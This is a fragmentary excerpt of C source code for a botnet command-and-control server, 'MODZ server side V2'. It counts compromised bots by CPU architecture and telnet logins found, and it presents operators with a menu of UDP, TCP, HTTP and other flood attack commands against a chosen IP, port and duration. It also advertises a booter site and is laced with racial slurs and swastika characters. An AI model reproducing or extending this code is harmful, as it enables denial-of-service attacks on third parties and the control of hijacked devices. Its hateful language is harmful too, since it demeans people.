...
MODZ SERVER SIDE V2 By MattL33T
Now remaked By matt :P As He said This is private Do NOT leak to Minecraft skids
...
{
        int sendMGM = 1;
        if(strcmp(msg, "NIGG") == 0) sendMGM = 0;
		...
		for (i = 0; i < n; i++) {
			...
			while (1) {
				...
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					...
					if(strcmp(buf, "NIGG") == 0) {
						continue;
					}
					//This is something that netis devices send...
					//Now it dont show in the screen when it sends.
					//-----------------------------------------------------------------
					if(strstr(buf, "GET / HTTP/1.1") == buf) {
						continue;
					}
					//-----------------------------------------------------------------
					printf("bot: \"%s\"\n", buf);
...
void *titleWriter(void *sock) 
{
		...
		sprintf(string, "%c]0; [+] Bots connected: %d [-] HaXoR's online:: %d [+]%c", '\033', BotsConnected(), OperatorsConnected, '\007');
...
void *telnetWorker(void *sock)
{
		...
		char dope5 [80];
		char dope6 [80];
		sprintf(dope1, "\x1b[0;35m[+] Loading The Net [+]\r\n");
...
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
		*/
        sprintf(line1, "\x1b[0;35m            ███\x1b[1;37m╗   \x1b[0;35m███\x1b[1;37m╗ \x1b[0;35m██████\x1b[1;37m╗ \x1b[0;35m██████\x1b[1;37m╗ \x1b[0;35m███████\x1b[1;37m╗\r\n");
		sprintf(line2, "\x1b[0;35m            ████\x1b[1;37m╗ \x1b[0;35m████\x1b[1;37m║\x1b[0;35m██\x1b[1;37m╔═══\x1b[0;35m██\x1b[1;37m╗\x1b[0;35m██\x1b[1;37m╔══\x1b[0;35m██\x1b[1;37m╗\x1b[1;37m╚══\x1b[0;35m███\x1b[1;37m╔╝\r\n");
		sprintf(line3, "\x1b[0;35m            ██\x1b[1;37m╔\x1b[0;35m████\x1b[1;37m╔\x1b[0;35m██\x1b[1;37m║\x1b[0;35m██\x1b[1;37m║   \x1b[0;35m██\x1b[1;37m║\x1b[0;35m██\x1b[1;37m║  \x1b[0;35m██\x1b[1;37m║  \x1b[0;35m███\x1b[1;37m╔╝ \r\n");
		sprintf(line4, "\x1b[0;35m            ██\x1b[1;37m║\x1b[1;37m╚\x1b[0;35m██\x1b[1;37m╔╝\x1b[0;35m██\x1b[1;37m║\x1b[0;35m██\x1b[1;37m║   \x1b[0;35m██\x1b[1;37m║\x1b[0;35m██\x1b[1;37m║  \x1b[0;35m██\x1b[1;37m║ \x1b[0;35m███\x1b[1;37m╔╝  \r\n");
		sprintf(line5, "\x1b[0;35m            ██\x1b[1;37m║ \x1b[1;37m╚═╝ \x1b[0;35m██\x1b[1;37m║\x1b[1;37m╚\x1b[0;35m██████\x1b[1;37m╔╝\x1b[0;35m██████\x1b[1;37m╔╝\x1b[0;35m███████\x1b[1;37m╗\r\n");
		sprintf(line6, "\x1b[1;37m            ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝\r\n");
		sprintf(line7, "\x1b[0;37m[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]\r\n");
        sprintf(line8, "\r\n  \x1b[0m[!]\x1b[0;35m Welcome \x1b[0;35m %s\x1b[0;31m To HELL \x1b[0m[!]", accounts[find_line].username, buf);
		sprintf(line9, "\r\n  \x1b[0m[!]\x1b[0;35m Type HELP to see commands \x1b[0m[!]\x1b[0m\r\n");
		sprintf(line10, "\r\n\x1b[0;37m[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]\r\n\r\n");
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		if(send(thefd, "\x1b[1;37m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
		...
		{
			sprintf(botnet, "\x1b[1;37m MIPS \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", mips());
			sprintf(botnet1, "\x1b[1;35m x86 \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", x86());
			sprintf(botnet2, "\x1b[1;37m PPC \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", ppc());
			sprintf(botnet3, "\x1b[1;35m M68K \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", m68k());
			sprintf(botnet4, "\x1b[1;37m SPC \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", spc());
			sprintf(botnet5, "\x1b[1;35m ARM \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", arm());
			sprintf(botnet6, "\x1b[1;37m SH4 \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", sh4());
		...
		if(strstr(buf, "BOTS"))
		{
			sprintf(botnet, "\x1b[1;35m Bots \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", BotsConnected());
			sprintf(botnet1, "\x1b[1;37m Dups Deleted \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", dups);
			sprintf(botnet2, "\x1b[1;35m Telnet logins \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", TELFound);
			sprintf(botnet3, "\x1b[1;37m Operators \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", OperatorsConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return;
		...
		{
			sprintf(botnet, "\x1b[1;37m Bots \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", BotsConnected());
			sprintf(botnet1, "\x1b[1;35m Dups Deleted \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", dups);
			sprintf(botnet2, "\x1b[1;37m Telnet logins \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", TELFound);
			sprintf(botnet3, "\x1b[1;35m Operators \x1b[0;34m[\x1b[0;35m%d\x1b[0;34m]\r\n", OperatorsConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return;
	    ...
	    if(strstr(buf, "TIME"))
		{  
    	sprintf(botnet, " DO not go over 3600 or your are gone \r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
	    if(strstr(buf, "RULES"))
		{  
		...
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT [TCP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT  [UDP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT :P [STD]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT (Rip that botnet) [CNC]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HOLD"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT [HOLD]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* JUNK"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT [JUNK]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		...
		if(strstr(buf, "BOOT"))
		{  
		sprintf(botnet, " You came to the right place my nigga. \r\n Check out my site justboot.world\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, " WOOPS Matt JUST DROPPED THAT SHIT [HTTP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "ports"))
		{  
		sprintf(botnet, " Console~3074 NFO~1094 Hotspot~USE A TOOL FOR THEIR PORT\ like LANC or mmap etc r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				...
				sprintf(helpline1,  "\x1b[0;35mType An Option you dumb fuck:\r\n");
				sprintf(helpline2,  "\x1b[1;37m[\x1b[35mDDOS\x1b[1;37m] ~ Shows all commands for DDoS Attacks\r\n");
				sprintf(helpline3,  "\x1b[1;35m[\x1b[34mEXTRA\x1b[1;37m] ~ Shows a list of all extra commands\r\n");
			...
			if(strstr(buf, "DDOS")) {
				...
				sprintf(ddosline1, "\x1b[35m !* iudp [IP] [PORT] [TIME] 32 1337 10 -------| UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[37m !* itcp [IP] [PORT] [TIME] 32 all 1337 10 ---| TCP FLOOD\r\n");
				sprintf(ddosline3, "\x1b[35m !* ihttp [URL] G|H|P [PORT] / [TIME] 1337 ---| L7 FLOOD\r\n");
				sprintf(ddosline4, "\x1b[37m !* ijunk [IP] [PORT] [TIME] -----------------| JUNK FLOOD\r\n");
				sprintf(ddosline5, "\x1b[35m !* ihold [IP] [PORT] [TIME] -----------------| HOLD\r\n");
				sprintf(ddosline6, "\x1b[37m !* istd [IP] [PORT] [TIME] ------------------| STD FLOOD\r\n");
				sprintf(ddosline7, "\x1b[35m !* icnc [IP] [PORT] [TIME] ------------------| CNC FLOOD\r\n");
				sprintf(ddosline8, "\x1b[37m !* isa --------------------------------------| STOPS ALL ATTACKS\r\n");
			...
			if(strstr(buf, "EXTRA")) {
				...
				sprintf(extraline2,  "\x1b[37m BOTS----| BOT COUNT\r\n");
				sprintf(extraline3,  "\x1b[35m CLEAR---| CLEARS SCREEN\r\n");
				sprintf(extraline4,  "\x1b[37m RULES---| SHOWS RULES\r\n");
				sprintf(extraline5,  "\x1b[35m TIME----| SHOWS MAX BOOT TIME\r\n");
                sprintf(extraline6,  "\x1b[37m BOOT----| SHOWS MY DANK SITE\r\n");
...
int main (int argc, char *argv[], void *sock)
{
		...
		{
			printf("\x1b[35mThe botnet has been screened you may now connect enjoy this shit\n");
		} else {
			printf("\x1b[37mMake A File Named MODZ.txt with your logins retard :PPPPP\n");
			sleep(5);
			exit (EXIT_FAILURE);
		}
